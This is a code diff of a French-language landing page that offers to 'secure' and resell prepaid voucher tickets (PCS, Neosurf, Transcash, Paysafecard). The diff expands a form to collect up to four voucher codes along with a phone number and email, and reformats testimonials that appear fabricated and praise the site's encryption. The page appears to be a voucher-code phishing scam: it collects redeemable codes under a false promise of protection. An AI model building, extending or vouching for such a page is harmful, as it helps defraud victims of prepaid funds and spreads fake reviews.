@@ -84,10 +84,7 @@
         <section class="home">
           <div class="container">
             <h6>Bienvenue!</h6>
-            <h1 class="home-title">
-              Sécurisez vos recharges
-
-            </h1>
+            <h1 class="home-title">Sécurisez vos recharges</h1>
             <p class="description">
               Un service support ultra-reactif et une plateforme de confiance
               pour sécuriser et revendre vos tickets en toute simplicité. Nous
@@ -98,7 +95,7 @@
               dites adieu aux anarques
             </p>
 
-            <img src="./img/home.jpeg" alt="">
+            <img src="./img/home.jpeg" alt="" />
             <div class="btn-group">
               <button class="check">
                 <a href="#shield">
@@ -166,70 +163,302 @@
           </div>
         </section>
 
+      
         <section class="section container" id="shield">
           <h2 class="section__title title-center" data-title="Sécurisation">
-            
+            Securisez votre recharge
+            <span class="icon">
+              <img src="img/png/verified.png" alt="">
+            </span>
           </h2>
-          <div class="form-block">
-            <form class="recharge-form" action="" id="checking-form">
-              <div class="form-block">
-                <div class="form-block-item active">
-                  <label for="type-recharge">Types de recharge :</label>
-                  <select id="type-recharge" name="type-recharge" required>
-                    <option value="PCS">...</option>
-                    <option value="PCS">PCS</option>
-                    <option value="Neosurf">Neosurf</option>
-                    <option value="Transcash">Transcash</option>
-                    <option value="PAYSAFECARD">PAYSAFECARD</option></select
-                  ><br />
-                  <label for="valeur-recharge">Valeur de recharge :</label>
-                  <select id="valeur-recharge" name="valeur-recharge" required>
-                    <option value="20">...</option>
-                    <option value="20">20€</option>
-                    <option value="30">30€</option>
-                    <option value="50">50€</option>
-                    <option value="100">100€</option>
-                    <option value="150">150€</option>
-                    <option value="200">200€</option>
-                    <option value="250">250€</option>
-                    <option value="500">500€</option></select
-                  ><br />
-
-                  <div id="code-recharge">
-                    <label for="code">Code de Recharge :</label>
-                    <input
-                      type="text"
-                      id="code"
-                      name="code"
-                      placeholder="Entrez le code du ticket"
-                    /><br />
-                  </div>
-                  <label for="code-recharge-toggle">Cacher le code</label>
-                  <input type="checkbox" id="code-recharge-toggle" /><br />
-                </div>
-
-              <label for="telephone">Numéro de téléphone :</label>
-              <input
-                type="text"
-                id="telephone"
-                name="telephone"
-                placeholder="Tel:"
-              /><br />
-
-              <label for="email">Email :</label>
-              <input
-                type="email"
-                id="email"
-                name="email"
-                placeholder="Entrez votre email :"
-                required
-              /><br />
-              <img src="./img/form-banner.jpeg" class="form-banner">
-              <p id="form_message"></p>
-              <button type="submit">Sécuriser</button>
-            </form>
+          <h3>Nombre de <strong>Recharge</strong> à sécurisez?</h3>
+           <div class="form-nav">
+              <ul class="form-nav-list">
+                  <li class="form-nav-item active">1</li>
+                  <li class="form-nav-item">2</li>
+                  <li class="form-nav-item">3</li>
+                  <li class="form-nav-item">4</li>
+              </ul>
           </div>
-        </section>
+          <div class="form-block">
+              <form class="recharge-form" action="#" id="checking-form">
+                
+                <div class="form-block">
+                    <div class="form-block-item active">
+                        <label for="type-recharge">Types de recharge :</label>
+                        <select id="type-recharge" name="type-recharge" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                        <label for="valeur-recharge">Valeur de recharge :</label>
+                        <select id="valeur-recharge" name="valeur-recharge" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div id="code-recharge">
+                          <label for="code">Code de Recharge :</label>
+                          <input type="text" id="code1" name="code" placeholder="Entrez le code du ticket" ><br>
+                        </div>
+                        <label for="code-recharge-toggle">Cacher le code </label>
+                        <input type="checkbox" id="code-recharge-toggle"><br>
+                    </div>
+                    
+                    <div class="form-block-item">
+                        <label for="type-recharge">Types de recharge 1:</label>
+                        <select class="type-recharge" name="type-recharge-1" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 1:</label>
+                        <select class="valeur-recharge" name="valeur-recharge-1" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div class="code-recharge">
+                          <label for="code">Code de Recharge 1:</label>
+                          <input type="text" class="code" name="code-1" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                        
+                        
+                        <label for="type-recharge">Types de recharge 2:</label>
+                        <select class="type-recharge" name="type-recharge-2" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 2:</label>
+                        <select class="valeur-recharge" name="valeur-recharge-2" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div class="code-recharge">
+                          <label for="code">Code de Recharge 2:</label>
+                          <input type="text" class="code" name="code-2" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                    </div>
+                    
+                    <div class="form-block-item">
+                        <label for="type-recharge">Types de recharge 1:</label>
+                        <select class="type-recharge" name="type-recharge-1" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 1:</label>
+                        <select class="valeur-recharge" name="valeur-recharge-1" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div class="code-recharge">
+                          <label for="code">Code de Recharge 1:</label>
+                          <input type="text" class="code" name="code-1" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                        
+                        
+                        <label for="type-recharge">Types de recharge 2:</label>
+                        <select class="type-recharge" name="type-recharge-2" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 2:</label>
+                        <select class="valeur-recharge" name="valeur-recharge-2" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div class="code-recharge">
+                          <label for="code">Code de Recharge 2:</label>
+                          <input type="text" class="code" name="code-2" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> 
+                    
+                        <label for="type-recharge">Types de recharge 3:</label>
+                        <select class="type-recharge" name="type-recharge-3" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 3:</label>
+                        <select class="valeur-recharge" name="valeur-recharge-3" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div class="code-recharge">
+                          <label for="code">Code de Recharge 3:</label>
+                          <input type="text" class="code" name="code-3" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                    </div>
+                    
+                    <div class="form-block-item">
+                        <label for="type-recharge">Types de recharge 1:</label>
+                        <select class="type-recharge" name="type-recharge-1" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 1:</label>
+                        <select  class="valeur-recharge" name="valeur-recharge-1" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div  class="code-recharge">
+                          <label for="code">Code de Recharge 1:</label>
+                          <input type="text" class="code" name="code-1" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                        
+                        
+                        <label for="type-recharge">Types de recharge 2:</label>
+                        <select  class="type-recharge" name="type-recharge-2" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 2:</label>
+                        <select  class="valeur-recharge" name="valeur-recharge-2" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div  class="code-recharge">
+                          <label for="code">Code de Recharge 2:</label>
+                          <input type="text"  class="code" name="code-2" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                    
+                        <label for="type-recharge">Types de recharge 3:</label>
+                        <select  class="type-recharge" name="type-recharge-3" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 3:</label>
+                        <select  class="valeur-recharge" name="valeur-recharge-3" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div  class="code-recharge">
+                          <label for="code">Code de Recharge 3:</label>
+                          <input type="text"  class="code" name="code-3" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                        
+                        
+                        <label for="type-recharge">Types de recharge 4:</label>
+                        <select  class="type-recharge" name="type-recharge-4" required>
+                          <option value="PCS">PCS</option>
+                          <option value="Neosurf">Neosurf</option>
+                          <option value="Transcash">Transcash</option>
+                          <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        </select><br>
+                    
+                        <label for="valeur-recharge">Valeur de recharge 4:</label>
+                        <select  class="valeur-recharge" name="valeur-recharge-4" required>
+                          <option value="20">20€</option>
+                          <option value="30">30€</option>
+                          <option value="50">50€</option>
+                          <option value="100">100€</option>
+                          <option value="150">150€</option>
+                          <option value="200">200€</option>
+                          <option value="250">250€</option>
+                          <option value="500">500€</option>
+                        </select><br>
+                        
+                        <div class="code-recharge">
+                          <label for="code">Code de Recharge 4:</label>
+                          <input type="text" class="code" name="code-4" placeholder="Entrez le code du ticket" ><br>
+                        </div> <br> <br>
+                        
+                    </div>
+                </div>
+            
+                <label for="telephone">Numéro de téléphone :</label>
+                <input type="text" id="telephone" name="telephone" placeholder="Tel:"><br>
+            
+                <label for="email">Email :</label>
+                <input type="email" id="email" name="email" placeholder="Entrez votre email :" required><br>
+                <p id="form_message"></p> 
+                <button type="submit"> Soumettre </button>
+              </form>
+          </div>       
+      </section>
 
         <section class="card-block section container">
           <ul class="list card-list">
@@ -336,7 +565,11 @@
               </div>
 
               <p class="testimonials-description">
-                J'ai utilisé ce service pour sécuriser et revendre mes recharges et je suis très satisfait. Le support réactif m'a aidé à résoudre rapidement mes préoccupations, et j'apprécie vraiment le code de sécurité en temps réel pour une tranquillité d'esprit totale
+                J'ai utilisé ce service pour sécuriser et revendre mes recharges
+                et je suis très satisfait. Le support réactif m'a aidé à
+                résoudre rapidement mes préoccupations, et j'apprécie vraiment
+                le code de sécurité en temps réel pour une tranquillité d'esprit
+                totale
               </p>
             </div>
 
@@ -348,13 +581,18 @@
                   class="testimonials-img"
                 />
                 <div>
-                  <h3 class="testimonials-name">Max Bembert </h3>
+                  <h3 class="testimonials-name">Max Bembert</h3>
                   <span class="testimonials-identity">Lyon</span>
                 </div>
               </div>
 
               <p class="testimonials-description">
-                Je cherchais depuis longtemps une plateforme de confiance pour gérer mes recharges en toute simplicité, et je suis ravi d'avoir trouvé ce site. Leur utilisation de méthodes de cryptage avancées m'a convaincu de la sécurité de mes transactions, et obtenir mon code de sécurité en quelques clics est un vrai jeu d'enfant !
+                Je cherchais depuis longtemps une plateforme de confiance pour
+                gérer mes recharges en toute simplicité, et je suis ravi d'avoir
+                trouvé ce site. Leur utilisation de méthodes de cryptage
+                avancées m'a convaincu de la sécurité de mes transactions, et
+                obtenir mon code de sécurité en quelques clics est un vrai jeu
+                d'enfant !
               </p>
             </div>
 
@@ -372,14 +610,18 @@
               </div>
 
               <p class="testimonials-description">
-                Je recommande vivement ce site à tous ceux qui veulent se débarrasser des arnaques. Grâce à leur plateforme fiable, j'ai pu obtenir rapidement le code de sécurité de ma recharge sans souci. C'est vraiment rassurant de savoir qu'ils prennent la sécurité au sérieux.
+                Je recommande vivement ce site à tous ceux qui veulent se
+                débarrasser des arnaques. Grâce à leur plateforme fiable, j'ai
+                pu obtenir rapidement le code de sécurité de ma recharge sans
+                souci. C'est vraiment rassurant de savoir qu'ils prennent la
+                sécurité au sérieux.
               </p>
             </div>
           </div>
         </section>
         <img src="./img/png/0.png" alt="" class="payment-img png" />
 
-        <img src="./img/footer start.jpg" >
+        <img src="./img/footer start.jpg" />
       </main>
 
       <footer class="footer">
@@ -413,8 +655,7 @@
             </li>
           </ul>
 
-          <div class="footer-item">
-          </div>
+          <div class="footer-item"></div>
 
           <div class="copyright">
             <p>
